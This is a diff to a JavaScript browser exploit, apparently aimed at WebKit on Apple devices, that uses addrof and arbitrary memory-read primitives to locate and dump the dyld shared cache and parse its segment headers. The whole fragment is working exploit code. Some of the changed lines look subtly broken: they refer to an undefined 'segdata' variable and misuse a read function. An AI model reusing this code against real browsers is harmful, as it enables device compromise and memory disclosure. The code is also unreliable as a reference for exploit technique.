@@ -474,7 +474,11 @@ function exploit(){
 	    	addr= new Int64(addr);
 	    	return new Int64('0x'+memory.read_i8(Add(addr, 3)).toString(16) + memory.read_i8(Add(addr, 2)).toString(16) + memory.read_i8(Add(addr, 1)).toString(16) + memory.read_i8(addr).toString(16));
 	    };
-
+	    function _u32(i)
+    {
+        return b2u32(this.read_i32(i,0));
+    }
+	memory.u32 = _u32;
 	    log('[*] Creating the HTMLDivElement wrapper...');
 	    var d = document.createElement('div');
 	    let ad_div = addrof(d);
@@ -505,18 +509,18 @@ function exploit(){
 	    log('[+] Dumping dyld shared cache...');
 	    log(hexdump(dcache_dump, 0, anchor));
 	    var dcache_base_seg = null;
-	    var dcache_nsegs = memory.read_i32(dcache_base + 0x10);
+	    var dcache_nsegs = memory.read_i32(dcache_base + 0x14);
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
-	    var dcache_segdata = memory.copyfrom(Add(dcache_base, memory.read_i32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
+	    var dcache_segdata = memory.read_i8(Add(dcache_base, memory.read_i32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
 	    var dcache_segs = [];
 	    for(var i = 0; i < dcache_nsegs; i++){
 	    	var off = i * 0x20;
 	    	var seg = {  
-	        addr:     new Int64(dcache_segdata.slice(off +  0x10, off +  0x14)),
-                size:     new Int64(dcache_segdata.slice(off +  0x14, off + 0x18)),
-                fileoff:  new Int64(dcache_segdata.slice(off + 0x18, off + 0x1c)),
-                maxprot:  b2u32(dcache_segdata.slice(off + 0x20, off + 0x24)),
-                initprot: b2u32(dcache_segdata.slice(off + 0x24, off + 0x28))
+	        addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),
+                size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),
+                fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),
+                maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),
+                initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))
 	    	};
 	    	dcache_segs.push(seg);
 	    	var max_rights = "";
